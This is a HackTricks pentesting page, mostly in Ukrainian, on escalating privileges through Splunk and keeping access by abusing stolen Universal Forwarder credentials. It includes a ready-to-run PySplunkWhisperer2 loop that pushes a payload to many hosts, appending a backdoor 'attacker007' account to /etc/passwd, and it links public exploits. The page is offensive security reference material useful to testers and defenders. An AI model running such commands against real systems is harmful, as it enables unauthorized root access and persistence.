# Splunk LPE and Persistence

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

Якщо ви **перераховуєте** машину **всередині** або **ззовні** і знаходите **запущений Splunk** (порт 8090), якщо вам пощастить знати будь-які **дійсні облікові дані**, ви можете **зловживати сервісом Splunk** для **виконання оболонки** від імені користувача, який запускає Splunk. Якщо його запускає root, ви можете підвищити привілеї до root.

Також, якщо ви **вже root і сервіс Splunk не слухає лише на localhost**, ви можете **вкрасти** файл **паролів** **з** сервісу Splunk і **зламати** паролі, або **додати нові** облікові дані до нього. І підтримувати стійкість на хості.

На першому зображенні нижче ви можете побачити, як виглядає веб-сторінка Splunkd.



## Splunk Universal Forwarder Agent Exploit Summary

Для отримання додаткових деталей перегляньте пост [https://eapolsniper.github.io/2020/08/14/Abusing-Splunk-Forwarders-For-RCE-And-Persistence/](https://eapolsniper.github.io/2020/08/14/Abusing-Splunk-Forwarders-For-RCE-And-Persistence/). Це лише резюме:

**Огляд експлуатації:**
Експлуатація, що націлена на агент Splunk Universal Forwarder (UF), дозволяє зловмисникам з паролем агента виконувати довільний код на системах, що запускають агента, потенційно компрометуючи всю мережу.

**Ключові моменти:**
- Агент UF не перевіряє вхідні з'єднання або автентичність коду, що робить його вразливим до несанкціонованого виконання коду.
- Загальні методи отримання паролів включають їх знаходження в мережевих каталогах, файлових спільних ресурсах або внутрішній документації.
- Успішна експлуатація може призвести до доступу на рівні SYSTEM або root на скомпрометованих хостах, ексфільтрації даних та подальшого проникнення в мережу.

**Виконання експлуатації:**
1. Зловмисник отримує пароль агента UF.
2. Використовує API Splunk для відправки команд або скриптів агентам.
3. Можливі дії включають витяг файлів, маніпуляцію обліковими записами користувачів та компрометацію системи.

**Вплив:**
- Повна компрометація мережі з дозволами на рівні SYSTEM/root на кожному хості.
- Потенціал для відключення ведення журналів, щоб уникнути виявлення.
- Встановлення бекдорів або програм-вимагачів.

**Приклад команди для експлуатації:**
```bash
for i in `cat ip.txt`; do python PySplunkWhisperer2_remote.py --host $i --port 8089 --username admin --password "12345678" --payload "echo 'attacker007:x:1003:1003::/home/:/bin/bash' >> /etc/passwd" --lhost 192.168.42.51;done
```
**Використовувані публічні експлойти:**
* https://github.com/cnotin/SplunkWhisperer2/tree/master/PySplunkWhisperer2
* https://www.exploit-db.com/exploits/46238
* https://www.exploit-db.com/exploits/46487


## Зловживання запитами Splunk

**Для отримання додаткової інформації перегляньте пост [https://blog.hrncirik.net/cve-2023-46214-analysis](https://blog.hrncirik.net/cve-2023-46214-analysis)**

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}
